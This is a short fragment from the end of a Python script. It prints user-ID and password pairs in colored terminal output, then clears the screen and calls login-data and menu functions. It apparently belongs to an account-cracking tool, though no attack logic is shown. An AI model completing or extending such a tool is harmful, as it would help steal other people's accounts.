		jalan(f"\r{H}[•]{K}╤►╤►╤►╤► {I}{uid}•{pw}")
	else:
		jalan(f"\r{H}[•]{K}╤►╤►╤►╤► {I}{uid}•{pw}")


if __name__=="__main__":
    os.system("clear")
    mkdir_data_login()
    menu()"))
